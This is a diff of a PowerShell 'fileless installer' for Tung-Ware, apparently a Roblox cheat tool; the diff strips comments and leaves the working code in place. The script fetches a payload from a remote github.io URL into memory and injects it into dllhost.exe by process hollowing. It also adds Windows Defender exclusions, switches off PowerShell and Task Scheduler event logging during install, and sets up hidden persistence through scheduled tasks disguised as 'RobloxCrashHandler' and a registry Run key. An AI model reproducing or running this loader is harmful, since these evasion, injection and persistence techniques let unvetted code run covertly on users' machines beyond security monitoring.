@@ -1,10 +1,3 @@
-﻿# ==============================================================================
-# Tung-Ware Cheat Environment - Fileless Remote Installer
-# ==============================================================================
-# Zero files written to disk. EXE decrypted in RAM and injected into dllhost.exe
-# via process hollowing. License key stored in registry. Persistence and portal
-# configured via encoded inline scheduled-task commands and a registry Run key.
-# ==============================================================================
 param (
     [string]$Key    = "",
     [switch]$Silent = $false,
@@ -12,10 +5,8 @@ param (
 )
 $ErrorActionPreference = "Stop"
 
-# Define script root directory (handles both script execution and copy-paste/EncodedCommand execution)
 $scriptRoot = if ($MyInvocation.MyCommand.Path) { Split-Path $MyInvocation.MyCommand.Path } elseif ($PSScriptRoot) { $PSScriptRoot } elseif ($PWD -and $PWD.Path) { $PWD.Path } else { (Get-Location).Path }
 
-# Normalize script root if it exists
 if ($scriptRoot) { $scriptRoot = (Get-Item $scriptRoot).FullName }
 
 $ServerBaseUrl  = "https://cc312123.github.io/tung-ware/files"
@@ -25,11 +16,9 @@ $LoaderTaskName = "RobloxCrashHandler"
 $PersistTask    = "RobloxCrashHandlerBootstrapper"
 $HostProcess    = "C:\Windows\System32\dllhost.exe"
 
-# Resolve workspace path safely to prevent system32 registry corruption
 $storedWorkspace = (Get-ItemProperty -Path $KeyRegPath -Name "Workspace" -ErrorAction SilentlyContinue).Workspace
 $storedPersistence = (Get-ItemProperty -Path $KeyRegPath -Name "Persistence" -ErrorAction SilentlyContinue).Persistence
 if ($PSBoundParameters.ContainsKey('Persist')) {
-    # Respect command-line parameter if explicitly provided
 } else {
     $Persist = $true
 }
@@ -42,7 +31,6 @@ if ($scriptRoot -and $scriptRoot -notmatch '(?i)\\system32') {
     $actualWorkspace = $storedWorkspace
 }
 
-# Verify Administrator privileges
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "==========================================" -ForegroundColor Red
@@ -55,7 +43,6 @@ Write-Host "==========================================" -ForegroundColor Cyan
 Write-Host "   TUNG-WARE SYSTEM - FILELESS INSTALLER  " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
-# Automatically add Windows Defender exclusion for workspace to prevent hollowing blockages
 Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
 try {
     $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
@@ -74,11 +61,9 @@ try {
     Write-Host "    WARNING: Could not automatically set Defender exclusions." -ForegroundColor Yellow
 }
 
-# Disable event logging during install to suppress traces
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
 wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:false 2>$null
 
-# -- License key (registry, never a file) --------------------------------------
 $licenseKey = ""
 if ($Key) {
     $licenseKey = $Key.Trim()
@@ -106,10 +91,8 @@ if (-not $licenseKey) {
             $licenseKey = $prompt.Trim()
         }
     } catch {
-        # VisualBasic prompt failed, check if we can show Forms InputBox or fallback to console Read-Host
         try {
             Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
-            # Note: Systems.Windows.Forms doesn't have an built-in input dialog, but we can try to fall back safely
             throw "Forms fallback"
         } catch {
             if ($Host.Name -eq "ConsoleHost" -and -not $Silent) {
@@ -123,10 +106,8 @@ if (-not $licenseKey) {
     if ([string]::IsNullOrWhiteSpace($licenseKey)) { Write-Error "Key cannot be empty."; Exit }
 }
 
-# Persistence prompt - automatically enabled
 $userAnswered = $false
 
-# Save key, workspace path, and server URL to registry
 New-Item -Path $KeyRegPath -Force -ErrorAction SilentlyContinue | Out-Null
 Set-ItemProperty -Path $KeyRegPath -Name $KeyRegName -Value $licenseKey -Force
 Set-ItemProperty -Path $KeyRegPath -Name "ServerUrl" -Value $ServerBaseUrl -Force
@@ -143,9 +124,6 @@ if ($Persist) {
     Set-ItemProperty -Path $KeyRegPath -Name "Persistence" -Value $storedPersistence -Force
 }
 
-# -- RunPE - x64 Process Hollowing ---------------------------------------------
-# Injects PE bytes into a suspended host process entirely in RAM.
-# No EXE is ever written to disk.
 $PECode = @'
 using System;
 using System.Runtime.InteropServices;
@@ -436,21 +414,17 @@ if (-not ([System.Management.Automation.PSTypeName]"RunPE").Type) {
     }
 }
 
-# -- 1. Stop any running instances ---------------------------------------------
 Write-Host "[1/4] Stopping existing instances..." -ForegroundColor Yellow
 Stop-ScheduledTask -TaskName $LoaderTaskName -ErrorAction SilentlyContinue
 Stop-ScheduledTask -TaskName $PersistTask    -ErrorAction SilentlyContinue
-# Kill old file-based process if still present from a previous install (exclude official Roblox process)
 Get-Process -Name "RobloxPlayerBeta", "RobloxCrashHandler" -ErrorAction SilentlyContinue | ForEach-Object {
     if ($_.Path -and ($_.Path -like "*\my private\*" -or $_.Path -like "*\Temp\*")) {
         Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
     }
 }
-# Kill our hollowed loader (listening on 9876) if already running
 $existing = Get-NetTCPConnection -LocalPort 9876 -State Listen -ErrorAction SilentlyContinue
 if ($existing) { Stop-Process -Id $existing.OwningProcess -Force -ErrorAction SilentlyContinue }
 
-# -- 2. Download or load compiled payload directly into RAM (no disk write) -----
 Write-Host "[2/4] Loading payload into RAM..." -ForegroundColor Yellow
 
 $exeBytes = $null
@@ -492,10 +466,8 @@ if (Test-Path $localExe) {
     }
 }
 
-# -- 3. Inject EXE from RAM into dllhost.exe via process hollowing --------------
 Write-Host "[3/4] Launching loader in-memory (process hollowing)..." -ForegroundColor Yellow
 
-# Remove old file-based install folder if it exists (legacy cleanup)
 $oldFolder = "$env:LOCALAPPDATA\RobloxPlayerBeta"
 if (Test-Path $oldFolder) { Remove-Item $oldFolder -Recurse -Force -ErrorAction SilentlyContinue }
 $newFolder = "$env:LOCALAPPDATA\RobloxCrashHandler"
@@ -515,7 +487,6 @@ if (([System.Management.Automation.PSTypeName]"RunPE").Type) {
 $started = $false
 if ($hollowSuccess) {
     Write-Host "    Loader running inside dllhost.exe. Waiting to verify initialization..." -ForegroundColor Green
-    # Check if port 9876 comes up
     for ($i = 0; $i -lt 5; $i++) {
         try {
             $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
@@ -577,13 +548,11 @@ if (-not $started) {
     Write-Host "    Loader running successfully." -ForegroundColor Green
 }
 
-# -- 4. Configure fileless startup ---------------------------------------------
 Write-Host "[4/4] Configuring fileless startup..." -ForegroundColor Yellow
 
 $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 
 if ($Persist) {
-    # Main loader startup task - inline EncodedCommand downloads + runs installer silently
     $loaderScript = @"
 `$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Accessibility'
 `$k=(gp `$p -N Configuration -EA 0).Configuration
@@ -618,7 +587,6 @@ objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Byp
 
     Write-Host "    Loader startup task registered (inline command, no file)." -ForegroundColor Green
     
-    # Remove redundant bootstrapper task if it exists
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
 } else {
     Write-Host "    Persistence disabled: Cleaning up any existing scheduled tasks/Run keys..." -ForegroundColor Green
@@ -629,7 +597,6 @@ objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Byp
     Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "TungWarePortal" -Force -ErrorAction SilentlyContinue | Out-Null
 }
 
-# Remove any legacy startup files from old installs
 @(
     "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.lnk",
     "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\TungWarePortal.url",
@@ -638,7 +605,6 @@ objShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Byp
     "$env:USERPROFILE\.tungware_persistence"
 ) | ForEach-Object { if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue } }
 
-# -- Wait for loader to come up and open portal ---------------------------------
 Write-Host "Waiting for loader to initialize on port 9876..." -ForegroundColor Yellow
 $started = $false
 for ($i = 0; $i -lt 20; $i++) {
@@ -710,7 +676,6 @@ if ($started) {
     }
 }
 
-# Re-enable event logging
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
 wevtutil.exe sl "Microsoft-Windows-TaskScheduler/Operational" /e:true 2>$null
 
